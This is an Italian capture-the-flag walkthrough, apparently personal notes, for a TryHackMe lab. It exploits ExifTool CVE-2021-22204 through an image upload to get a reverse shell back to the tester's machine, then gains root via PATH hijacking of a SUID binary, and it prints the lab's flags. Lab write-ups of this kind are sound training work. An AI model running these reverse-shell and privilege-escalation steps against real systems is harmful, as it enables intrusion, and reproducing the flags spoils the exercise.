
#tryhackmelabs #laboratorio 

https://tryhackme.com/room/dejavu

```
nmap -Pn -sS -sV -O -vvv --open --min-rate 5000 -n -p- 10.10.159.198 -oX risultatoscan
```

```
service postgresql start
```

```
msfconsole
```

```
db_status
```

```
workspace
```

```
workspace -a dejavu
```
	creiamo nuova area di lavoro
```
workspace
```

```
db_nmap nmap -Pn -sS -sV -O -vvv --open --min-rate 5000 -n -p- 10.10.159.198 -oX risultatoscan
```

```
hosts
```
	vediamo se importato correttamente host
```
services
```
	vediamo se importati correttamente servizi come port etc

```
10.10.159.198  22    tcp    ssh   open   OpenSSH 8.0 protocol 2.0
10.10.159.198  80    tcp    http  open   Golang net/http server Go-IPFS json-rpc or InfluxDB API
```

```
db_nmap -sC -sV -p 22,80 -Pn 10.10.159.198 -oX risultatoscan2
```

Fai un giro sul sito. Riesci a trovare commenti degli sviluppatori?
```
curl http://10.10.159.198/
```

```
What should happen when we click on a picture of a dog? 
        How do we style it to make it show that it's clickable?
```

Riesci a trovare la pagina che fornisce maggiori dettagli su una foto di un cane?


Esegui una scansione Nmap del target. Quale versione di SSH è in uso?
```
OpenSSH 8.0 (protocol 2.0)
```

enumeriamo le directory
```
gobuster dir -u http://10.10.159.198 -w /usr/share/wordlists/dirb/big.txt -t50
```

```
/upload               (Status: 301) [Size: 0] [--> upload/]
```
andiamo su
```
http://10.10.159.198/upload
```

Quale pagina puoi utilizzare per caricare la foto del tuo cane?
```
/upload/
```


Avviamo  Burp Suite ed iniziamo ad esplorare il sito per mapparlo con SiteMap
troviamo due percorsi API che il sito web utilizza per recuperare informazioni sulle foto dei cani. Uno recupera il titolo e la didascalia, mentre l'altro viene utilizzato per recuperare la data e l'autore.

Quale percorso API viene utilizzato per fornire il titolo e la didascalia per un'immagine specifica di un cane?
```
/dog/getmetadata
```
Quale percorso API utilizza l'applicazione per recuperare ulteriori informazioni sulla foto del cane?
```
dog/getexifdata
```
Quale attributo nella risposta JSON da questo endpoint specifica la versione di ExifTool utilizzata dall'applicazione web?
Osserva l'endpoint API dell'ultima domanda nella mappa di destinazione di BurpSuite.
```
ExifToolVersion
```
Quale versione di ExifTool è in uso?
```
12.23
```
Di solito, esporre i numeri di versione sarebbe considerato un problema di bassa valutazione o informativo, ma come scopriremo può avere conseguenze più gravi. [](https://owasp.org/www-project-api-security/)`API3:2019 Excessive Data Exposure`


Quale exploit RCE è presente in questa versione di ExifTool? Indica il numero CVE nel formato CVE-XXXX-XXXXX
facciamo una ricerca
```
CVE-2021-22204
```

**Alla ricerca della patch**

Esaminando la vulnerabilità, possiamo vedere che le è stata assegnata  la vulnerabilità CVE -2021-22204. Esaminando la [pagina](https://nvd.nist.gov/vuln/detail/CVE-2021-22204) [CVE](https://nvd.nist.gov/vuln/detail/CVE-2021-22204) [di NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-22204) per la falla, si nota che è stata corretta nella versione 12.24. La pagina contiene anche un link alla patch, che è molto utile perché ci permette di vedere come è stata risolta la vulnerabilità. Il file git diff è riportato di seguito.

```perl
-	230	# must protect unescaped "$" and "@" symbols, and "\" at end of string
-	231	$tok =~ s{\\(.)|([\$\@]|\\$)}{'\\'.($2 || $1)}sge;
-	232	# convert C escape sequences (allowed in quoted text)
-	233	$tok = eval qq{"$tok"};
+	230	# convert C escape sequences, allowed in quoted text
+	231	# (note: this only converts a few of them!)
+	232	my %esc = ( a => "\a", b => "\b", f => "\f", n => "\n",
+	233	r => "\r", t => "\t", '"' => '"', '\\' => '\\' );
+	234	$tok =~ s/\\(.)/$esc{$1}||'\\'.$1/egs;
```

**Comprendere il codice e il pericolo**

La funzione pericolosa qui è la chiamata a eval alla riga 233. Eval viene utilizzata per eseguire codice Perl contenuto in una variabile, e la variabile deriva dai dati EXIF ​​nella nostra immagine. Il nostro obiettivo è il controllo sul codice eseguito, quindi al momento sembra che l'unica barriera tra noi e l'esecuzione di codice arbitrario sia il filtro alla riga 231.

```perl
-# must protect unescaped "$" and "@" symbols, and "\" at end of string
$tok =~ s{\\(.)|([\$\@]|\\$)}{'\\'.($2 || $1)}sge;
```

Vale la pena spiegare cosa  `=~` viene utilizzato qui. È un operatore Perl solitamente utilizzato con le espressioni regolari e può essere molto, molto complicato. È importante notare che il primo carattere dopo ~ è 's'. Ciò significa che l'operatore eseguirà una ricerca e sostituzione con l'espressione regolare che segue.

Anche questa espressione regolare è molto complicata, purtroppo. C'è un commento utile che ne spiega l'intento, ovvero l'escape dei caratteri speciali nella stringa. Un'altra scoperta spiacevole, se guardiamo il codice sorgente del nostro filtro che non è stato catturato nel diff, è che anche questo filtro si basa sulle virgolette per delimitare le estremità dei campi.

Combinando tutte queste informazioni, possiamo capire come si verificherebbe una vulnerabilità di iniezione di codice se riuscissimo a bypassare il filtro e a usare Perl `eval`come codice.  Dato che questo filtro è fastidioso e l'exploit è piuttosto complesso da progettare, useremo semplicemente Metasploit per creare il nostro exploit. Più avanti saranno inclusi articoli che descrivono come creare manualmente un exploit.

**Creazione del nostro exploit con Metasploit**

Per creare il nostro exploit, dobbiamo prima trovare il modulo Metasploit per questa vulnerabilità. Se non hai familiarità con l'individuazione degli exploit in Metasploit , prova la stanza [introduttiva di](https://tryhackme.com/room/metasploitintro) [TryHackMe Metasploit](https://tryhackme.com/room/metasploitintro) .  

Dobbiamo quindi impostare le opzioni appropriate per un payload di reverse shell. Trattandosi di una vulnerabilità di iniezione di comandi in Perl , vogliamo un payload di comando piuttosto che un payload binario. Assicuratevi che il vostro LHOST sia corretto e che venga avviato un listener netcat!

```
search ExifTool
```

```
use exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
```

```
show options
```

```
run
```

```
msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) > run

[+] msf.jpg stored at /root/.msf4/local/msf.jpg

```
ci mettiamo in ascolto
```
nc -lvnp 4444
```
e facciamo upload del nostro cane msf.jpg

visitiamo la nostra pagina de l cane ed otteniamo la reverse shell!!

**oppure** possiamo ottenere la reverse shell anche con questo script in python!

```
searchsploit ExifTool
```

```
ExifTool 12.23 - Arbitrary Code Execution                                                                     | linux/local/50911.py
```

```
searchsploit -m 50911
```

```
python3 50911.py
```
creiamo il nostro payload file image.jpg 
```
python3 50911.py -s 10.14.99.134 1234
```

se riceviamo errori di comando bzz non trovato installarlo

**bzz** - Utilità di compressione DjVu per uso generale.
```
sudo apt-get update
```

```
sudo apt-get install djvulibre-bin
```
ci mettiamo in ascolto
```
nc -lvnp 1234
```
uplodiamo il nostro file image.jpg
```
http://10.10.159.198/upload/
```
visitiamo la pagina del nostro cane ed otteniamo la reverse shell!
```
└─$ nc -lvnp 1234                        
listening on [any] 1234 ...
connect to [10.14.99.134] from (UNKNOWN) [10.10.56.138] 59560
sh: cannot set terminal process group (796): Inappropriate ioctl for device
sh: no job control in this shell
sh-4.4$ whoami
whoami
dogpics
```

```
ls
```
```
cat user.txt
```

```
ls
dogImages
exiftool
resources
serverManager
serverManager.c
staticDogs.json
systemctl
temp
user.txt
webserver
webserver.go
sh-4.4$ cat user.txt
cat user.txt
dejavu{735c0553063625f41879e57d5b4f3352}

```

```
dejavu{735c0553063625f41879e57d5b4f3352}
```


**Stabilizza la shell  per assicurarti di poter eseguire binari interattivi**
```
cat /etc/shells
```
	vediamo shell presenti

```
script /dev/null -c bash
```
poi  per mandarla in background
```
Crtl+Z
```

```
stty raw -echo; fg
```
scriviamo reset ed invio
```
reset
```
tipo terminale
```
xterm
```

```
export TERM=xterm
```

```
export SHELL=bash
```

```
stty -a
```
	per vedere le nostre righe e colonne

```
stty rows 24 columns 80
```


**Escalation dei privilegi - Enumerazione e sfruttamento del PATH**

```
ls -al
```
Un binario SUID! La presenza di uno di questi in una directory home è piuttosto insolita, ma sembra che abbiamo un file lasciato dall'amministratore del server per facilitare la gestione del web server. Sembra anche che abbiamo il codice sorgente di questo programma C, molto utile per  sfruttarlo.
```
-rwsr-sr-x. 1 root    root      17648 Sep 11  2021 serverManager
-rw-r--r--. 1 dogpics dogpics     847 Sep 11  2021 serverManager.c
```

Un **binario SUID** ha permessi speciali che consentono al programma di utilizzare la `setuid`chiamata di sistema. La `setuid`chiamata consente al processo di impostare il proprio ID utente. Se si esegue la chiamata  `setuid(0)` e il processo ha i permessi corretti, il programma verrà eseguito come root.

Quando un programma necessita di eseguire parti del codice come root ma non l'intero programma come root, spesso si utilizza il SUID. Un esempio è il web server Apache2, che inizialmente viene eseguito come root per collegarsi alla porta 80 e successivamente perde questi privilegi elevati.

I binari SUID possono impostare il proprio UID solo sul proprietario dell'UID del binario, a meno che il binario non sia di proprietà di root, nel qual caso possono impostarlo su qualsiasi UID . Di solito non è necessario richiamare se stessi, _solitamente_`setuid` lo fa il programma .

Un'alternativa più moderna ai binari setuid sono le Linux Capabilities, che offrono un controllo molto più granulare sui permessi,  `CAP_NET_BIND_SERVICE` consentendo ad esempio ai programmi di collegarsi a porte basse (privilegiate, inferiori a 1024) senza essere eseguiti come root. La capacità `CAP_SET_UID`è equivalente ai permessi suid, consentendo al programma di chiamare`setuid`

**Cosa fa il binario vulnerabile?**

Se eseguiamo il binario, con `./serverManager`, otteniamo una scelta di operazioni.
```
sh-4.4$ ./serverManager
./serverManager
0
● dogpics.service - Dog pictures
   Loaded: loaded (/etc/systemd/system/dogpics.service; enabled; vendor preset: disabled)
   Active: active (running) since Tue 2025-04-22 07:59:06 BST; 20min ago
 Main PID: 796 (webserver)
    Tasks: 8 (limit: 5971)
   Memory: 27.6M
   CGroup: /system.slice/dogpics.service
           ├─ 796 /home/dogpics/webserver -p 80
           ├─1122 /bin/sh -i
           ├─1136 ./serverManager
           └─1138 systemctl status --no-pager dogpics

Apr 22 07:59:06 dejavu systemd[1]: Started Dog pictures.
Welcome to the DogPics server manager Version 1.0
Please enter a choice:
0 -     Get server status
1 -     Restart server

```

Selezionando 0 otteniamo lo stato del servizio webserver, mentre 1 ci permette di riavviarlo. Il riavvio del servizio richiederebbe normalmente privilegi di root, quindi ha senso che il binario sia SUID.


Verifica (in base all'output) che il programma serverManager esegua systemctl quando lo esegui.  
Prova a eseguire tu stesso lo stesso comando del binario
```
systemctl status dogpics --no-pager
```

```
systemctl status dogpics --no-pager
● dogpics.service - Dog pictures
   Loaded: loaded (/etc/systemd/system/dogpics.service; enabled; vendor preset: disabled)
   Active: active (running) since Tue 2025-04-22 07:59:06 BST; 28min ago
 Main PID: 796 (webserver)
    Tasks: 14 (limit: 5971)
   Memory: 31.8M
   CGroup: /system.slice/dogpics.service
           ├─ 796 /home/dogpics/webserver -p 80
           ├─1122 /bin/sh -i
           ├─1142 /bin/bash -i
           ├─1157 script /dev/null -c bash
           ├─1159 bash
           ├─1179 script /dev/null -c bash
           ├─1181 bash
           ├─1202 script /dev/null -c bash
           ├─1204 bash
           └─1229 systemctl status dogpics --no-pager

```

**Avendo a disposizione il codice sorgente dell'applicazione, possiamo individuare più facilmente la vulnerabilità.**

serverManager.c - vi

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(void)
{   
    setuid(0);
    setgid(0);
    printf(
        "Welcome to the DogPics server manager Version 1.0\n"
        "Please enter a choice:\n");
    int operation = 0;
    printf(
        "0 -\tGet server status\n"
        "1 -\tRestart server\n");
    while (operation < 48 || operation > 49) {
        operation = getchar();
        getchar();
        if (operation < 48 || operation > 49) {
            printf("Invalid choice.\n");
        }
    }
    operation = operation - 48;
    //printf("Choice was:\t%d\n",operation);
    switch (operation)
    {
    case 0:
        //printf("0\n");
        system("systemctl status --no-pager dogpics");
        break;
    case 1:
        system("sudo systemctl restart dogpics");
        break;
    default:
        break;
    }
}
```

La vulnerabilità deriva dalla chiamata a system() senza fornire un percorso completo al binario. Ciò significa che possiamo creare un binario systemctl fittizio che verrà eseguito come root e che ci incrementerà i privilegi.

Possiamo anche usare un programma chiamato ltrace che ci permette di visualizzare le chiamate di sistema e di libreria, sebbene non sia installato sulla macchina. Prestate molta attenzione al comando system() visto in precedenza, che fornisce systemctl senza il suo percorso completo.

La vulnerabilità deriva dalla chiamata a system() senza fornire un percorso completo al binario. Ciò significa che possiamo creare un binario systemctl fittizio che verrà eseguito come root e che ci incrementerà i privilegi.

Possiamo anche usare un programma chiamato ltrace che ci permette di visualizzare le chiamate di sistema e di libreria, sebbene non sia installato sulla macchina. Prestate molta attenzione al comando system() visto in precedenza, che fornisce systemctl senza il suo percorso completo.

**Spiegazione della variabile PATH**

La variabile PATH indica alla shell dove cercare i binari chiamati per nome, quindi, ad esempio, ls è in realtà /bin/ls . È costituito da una sequenza di directory, separate da due punti. La shell eseguirà il primo binario corrispondente, cercando in ogni directory da sinistra a destra. Questa direzione è importante.  

**Cosa stiamo sfruttando?**

Qui stiamo sfruttando la combinazione di due cose.

Innanzitutto, il binario viene eseguito come root a causa del SUID.

In secondo luogo, le chiamate binarie `systemctl`con un percorso incompleto (ad esempio non `/usr/bin/systemctl`, solo `systemctl`da sole).

Poiché il sistema eseguirà il primo binario trovato da PATH che corrisponde a systemctl  in questo punto, possiamo creare un nostro fake `systemctl` da eseguire, che verrà eseguito come root (poiché eredita l' UID e il GID del processo padre).

Il nostro falso `systemctl`può essere semplice come `/bin/bash`un testo normale per avviare una nuova shell: Linux tratta i file di testo eseguibili come script di shell.

Creiamo un falso `systemctl`, aggiungiamolo al percorso e otteniamo la radice.

Guscio invertito


```
which systemctl
```
	which serve per localizzare il percorso di un eseguibile
```
/usr/bin/systemctl
```

```
echo '/bin/bash' > systemctl
```
	Stiamo creando un file di testo normale con il contenuto `/bin/bash`che, una volta eseguito, avvierà una shell.
	
```
chmod +x systemctl
```
	 Dobbiamo rendere il nostro falso `systemctl`eseguibile, altrimenti verrà ignorato.
	 
```
export PATH=.:$PATH
```
	qui aggiungiamo `.`(la nostra directory di lavoro corrente) all'inizio di PATH. Questo significa che il sistema cercherà i binari nella nostra directory di lavoro corrente prima di cercare nel resto di PATH, e troverà il nostro falso `systemctl`prima di quello autentico.
	
```
which systemctl
```
	Per verificare che il nostro fake `systemctl`verrà eseguito se viene utilizzato il comando `systemctl`, utilizziamo `which`. `which`in pratica esegue la ricerca PATH per noi e stampa i risultati.
	
```
./systemctl
```
	Esegui il binario vulnerabile!

```
./serverManager
```

```
[dogpics@dejavu ~]$ ./serverManager 
Welcome to the DogPics server manager Version 1.0
Please enter a choice:
0 -	Get server status
1 -	Restart server
0
```

```
whoami
```
```
[root@dejavu ~]# whoami
root
```

```
[root@dejavu ~]# ls /root
root.txt
[root@dejavu ~]# cat /root/root.txt
dejavu{5ad931368bdc46f856febe4834ace627}
```


Recupera il flag di root da /root/root.txt. Cos'è il flag di root?
```
dejavu{5ad931368bdc46f856febe4834ace627}
```

**nota su SELinux**
Invece di provare a configurare SELinux per consentire al server web di collegarsi alla porta 80, l'amministratore di sistema l'ha semplicemente disabilitata. Questo è un approccio piuttosto comune, ma non è affatto quello "corretto", che consisterebbe nell'apprendere i fondamenti di SELinux e configurarlo correttamente. Con il comando `getenforce` possiamo verificare se SELinux sta applicando le sue regole (il comando visualizza "disabled").
```
getenforce
```
```
sh-4.4$ getenforce
getenforce
Disabled
```

```
10.10.56.138
```










